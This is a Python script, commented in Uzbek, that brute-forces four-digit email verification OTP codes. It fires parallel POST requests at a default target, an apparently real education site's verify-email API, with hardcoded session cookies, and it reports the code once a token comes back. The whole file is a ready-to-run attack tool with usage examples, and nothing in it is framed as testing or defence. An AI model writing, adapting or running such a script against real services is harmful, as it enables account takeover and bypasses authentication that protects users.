import requests
import argparse
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed


# Signal va hisoblagich
topildi_event = threading.Event()
natija_lock = threading.Lock()
hisoblagich = {"yuborildi": 0}

# So'rov headerslari
HEADERS = {
    "Content-Type": "application/json",
    "Cookie": "_ym_uid=1780174628524671068; _ym_d=1780174628; _ym_isad=2; _ym_visorc=w; _ga=GA1.1.1089251535.1780174629; _ga_Y95141VP7P=GS2.1.s1780174629$o1$g1$t1780174676$j13$l0$h0"
}


def bitta_sorov(url, email, otp_code, jami):
    """Bitta OTP kod bilan POST so'rov yuboradi"""

    if topildi_event.is_set():
        return None

    data = {
        "email": email,
        "otpCode": otp_code
    }

    try:
        javob = requests.post(url, json=data, headers=HEADERS, timeout=10)

        status = javob.status_code
        javob_matni = javob.text

        with natija_lock:
            hisoblagich["yuborildi"] += 1
            joriy = hisoblagich["yuborildi"]

        # Muvaffaqiyatni tekshirish
        if status == 200 and "token" in javob_matni:
            topildi_event.set()
            print(f"\n  {'*'*60}")
            print(f"  *  OTP KOD TOPILDI!")
            print(f"  *")
            print(f"  *  Email    : {email}")
            print(f"  *  OTP Code : {otp_code}")
            print(f"  *  Status   : {status}")
            print(f"  *  Urinish  : {joriy}/{jami}")
            print(f"  *")
            print(f"  *  Javob    : {javob_matni[:200]}")
            print(f"  {'*'*60}\n")
            return otp_code

        # Noto'g'ri kod
        print(f"  [-] {joriy:>5}/{jami} | OTP: {otp_code} | Status: {status} | {javob_matni[:60]}")

    except requests.exceptions.Timeout:
        with natija_lock:
            hisoblagich["yuborildi"] += 1
            joriy = hisoblagich["yuborildi"]
        print(f"  [T] {joriy:>5}/{jami} | OTP: {otp_code} | TIMEOUT")
    except requests.exceptions.ConnectionError:
        with natija_lock:
            hisoblagich["yuborildi"] += 1
            joriy = hisoblagich["yuborildi"]
        print(f"  [X] {joriy:>5}/{jami} | OTP: {otp_code} | ULANIB BO'LMADI")
    except Exception as e:
        with natija_lock:
            hisoblagich["yuborildi"] += 1
            joriy = hisoblagich["yuborildi"]
        print(f"  [?] {joriy:>5}/{jami} | OTP: {otp_code} | Xato: {e}")

    return None


def otp_bruteforce(url, email, boshlanish=1, tugash=10000, threadlar=10):
    """OTP kodlarni parallel ravishda sinab ko'radi"""

    kodlar = [f"{i:04d}" for i in range(boshlanish, tugash + 1)]
    jami = len(kodlar)

    print(f"\n{'='*60}")
    print(f"  OTP KOD BRUTEFORCE (PARALLEL)")
    print(f"{'='*60}")
    print(f"  URL       : {url}")
    print(f"  Email     : {email}")
    print(f"  Diapazon  : {kodlar[0]} — {kodlar[-1]}")
    print(f"  Jami      : {jami} ta kod")
    print(f"  Threadlar : {threadlar} ta")
    print(f"{'='*60}\n")

    topilgan = None

    with ThreadPoolExecutor(max_workers=threadlar) as executor:
        futures = {
            executor.submit(bitta_sorov, url, email, kod, jami): kod
            for kod in kodlar
        }

        for future in as_completed(futures):
            natija = future.result()
            if natija:
                topilgan = natija
                executor.shutdown(wait=False, cancel_futures=True)
                break

    if not topilgan:
        print(f"\n  OTP kod topilmadi. {hisoblagich['yuborildi']} ta kod sinab ko'rildi.\n")

    return topilgan


def main():
    parser = argparse.ArgumentParser(
        description='OTP kod bruteforce qiluvchi',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Misol:
  python otp_bruteforce.py -e user@gmail.com
  python otp_bruteforce.py -e user@gmail.com -b 1 -g 9999 -t 20
  python otp_bruteforce.py -e user@gmail.com -t 50
        """
    )

    parser.add_argument(
        '-e', '--email',
        required=True,
        help='Email manzil'
    )

    parser.add_argument(
        '-u', '--url',
        default='https://api.otaboyev-prep.uz/auth/verify-email',
        help='API URL (standart: otaboyev-prep)'
    )

    parser.add_argument(
        '-b', '--boshlanish',
        type=int,
        default=1,
        help='Boshlang\'ich kod (standart: 1 → 0001)'
    )

    parser.add_argument(
        '-g', '--tugash',
        type=int,
        default=10000,
        help='Oxirgi kod (standart: 10000)'
    )

    parser.add_argument(
        '-t', '--threadlar',
        type=int,
        default=10,
        help='Parallel threadlar soni (standart: 10)'
    )

    args = parser.parse_args()

    otp_bruteforce(args.url, args.email, args.boshlanish, args.tugash, args.threadlar)


if __name__ == '__main__':
    main()
